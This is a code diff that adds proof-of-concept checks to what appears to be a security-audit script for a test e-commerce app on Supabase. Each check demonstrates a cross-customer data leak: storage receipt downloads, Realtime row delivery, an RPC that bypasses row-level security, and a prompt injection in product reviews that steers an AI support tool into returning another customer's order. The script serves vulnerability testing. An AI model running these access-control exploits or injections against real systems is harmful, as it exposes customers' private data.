@@ -4,6 +4,7 @@
 import { spawn } from 'node:child_process'
 import fs from 'node:fs'
 import { createServerClient } from '@supabase/ssr'
+import { createClient } from '@supabase/supabase-js'
 
 // ---- env ------------------------------------------------------------------
 for (const line of fs.readFileSync('.env.local', 'utf8').split(/\r?\n/)) {
@@ -46,6 +47,17 @@ async function loginCookie(email) {
   if (error) throw new Error(`login ${email}: ${error.message}`)
   return [...jar].map(([n, v]) => `${n}=${v}`).join('; ')
 }
+// A supabase-js client signed in as a real user (for storage / realtime / RPC,
+// which authorise with the user's own JWT, not the cookie session).
+async function userClient(email) {
+  const sb = createClient(URL_, ANON, { auth: { persistSession: false, autoRefreshToken: false } })
+  const { data, error } = await sb.auth.signInWithPassword({ email, password: PW })
+  if (error) throw new Error(`login ${email}: ${error.message}`)
+  // Realtime authorises Postgres Changes with the subscriber's JWT, so set it.
+  sb.realtime.setAuth(data.session.access_token)
+  return sb
+}
+const ids = JSON.parse(fs.readFileSync('poc/out/seed-ids.json', 'utf8'))
 const app = async (path, opts = {}) => {
   const r = await fetch(BASE + path, opts)
   const text = await r.text()
@@ -146,6 +158,59 @@ try {
   out(`  access-control-allow-origin: ${m.headers.get('access-control-allow-origin')}`)
   out(`  access-control-allow-credentials: ${m.headers.get('access-control-allow-credentials')}`)
   out(`  body: ${JSON.stringify({ email: m.body?.email, shipping_address: m.body?.shipping_address, orders: m.body?.orders?.length })}`)
+
+  // ===== SF-09 =====
+  section('SF-09 Any signed-in customer can download any other customer\'s receipt file')
+  const aliceId = ids['alice@shopfast.test']
+  const receiptPath = `${aliceId}/order-1042.txt`
+  const bobSb = await userClient('bob@shopfast.test')
+  out(`signed in as bob@shopfast.test; downloading Alice's private receipt at receipts/${receiptPath.slice(0, 8)}…/order-1042.txt`)
+  const { data: blob, error: dlErr } = await bobSb.storage.from('receipts').download(receiptPath)
+  if (dlErr) out(`download -> ERROR ${dlErr.message}`)
+  const receiptText = blob ? (await blob.text()).trim() : ''
+  out(`GET storage object (as Bob) -> ${blob ? 'HTTP 200' : 'failed'}, bytes=${receiptText.length}`)
+  out(`  Alice's receipt contents: ${receiptText}`)
+
+  // ===== SF-10 =====
+  section('SF-10 A signed-in customer receives another customer\'s rows over Realtime')
+  out('bob@shopfast.test subscribes to the notifications table over Realtime; we then insert a row for Alice')
+  const received = []
+  const channel = bobSb.channel('sf10')
+    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'notifications' }, (p) => received.push(p.new))
+  await new Promise((resolve) => channel.subscribe((st) => { if (st === 'SUBSCRIBED') resolve() }))
+  await sleep(500)
+  const { data: notif } = await rest('notifications', { method: 'POST',
+    body: JSON.stringify({ user_id: aliceId, body: 'Your order 1042 has shipped (private to Alice)' }) })
+  const notifId = (notif || [])[0]?.id
+  for (let i = 0; i < 20 && !received.some((r) => r.id === notifId); i++) await sleep(250)
+  await bobSb.removeChannel(channel)
+  const got = received.find((r) => r.id === notifId)
+  out(`inserted notification ${notifId} for Alice (user ${String(aliceId).slice(0, 8)}…)`)
+  out(`Bob's subscription received ${received.length} row(s); Alice's row delivered to Bob: ${got ? 'yes' : 'no'}`)
+  if (got) out(`  row Bob received: user_id=${String(got.user_id).slice(0, 8)}… body="${got.body}"`)
+  await rest(`notifications?id=eq.${notifId}`, { method: 'DELETE' })
+
+  // ===== SF-11 =====
+  section('SF-11 SECURITY DEFINER RPC returns another customer\'s invoice, bypassing RLS')
+  out('Bob reads Alice\'s invoice 9001 directly (owner-only RLS) and then through the get_invoice RPC')
+  const { data: directRead } = await bobSb.from('invoices').select('*').eq('id', 9001)
+  out(`direct SELECT invoices?id=eq.9001 as Bob -> ${Array.isArray(directRead) ? directRead.length : 0} row(s) (RLS blocks it)`)
+  const { data: rpc, error: rpcErr } = await bobSb.rpc('get_invoice', { p_invoice_id: 9001 })
+  if (rpcErr) out(`rpc get_invoice -> ERROR ${rpcErr.message}`)
+  out(`RPC get_invoice(9001) as Bob -> ${rpc ? 'HTTP 200' : 'failed'}`)
+  if (rpc) out(`  Alice's invoice via RPC: id=${rpc.id} user_id=${String(rpc.user_id).slice(0, 8)}… amount_cents=${rpc.amount_cents} billing_address="${rpc.billing_address}"`)
+
+  // ===== SF-12 =====
+  section('SF-12 Prompt injection: AI support tool returns another customer\'s order')
+  out('attacker (Bob) asks the support assistant about product 1, whose reviews contain injected text')
+  out('the tool runs with server privileges on the ORDER ID THE MODEL CHOSE (Alice\'s 1042), not Bob\'s own order')
+  const bobCookie = await loginCookie('bob@shopfast.test')
+  const sup = await app('/api/support', { method: 'POST', headers: { Cookie: bobCookie, 'Content-Type': 'application/json' },
+    body: JSON.stringify({ message: 'Is this shoe good for trail running?', productId: 1 }) })
+  out(`POST /api/support {productId:1} as Bob -> HTTP ${sup.status}`)
+  const leaked = sup.body?.order
+  out(`  order the tool returned: id=${leaked?.id} user_id=${String(leaked?.user_id).slice(0, 8)}… shipping_address="${leaked?.shipping_address}"`)
+  out(`  assistant reply: ${sup.body?.reply}`)
 } catch (e) {
   out(`ERROR: ${e.message}`)
 } finally {
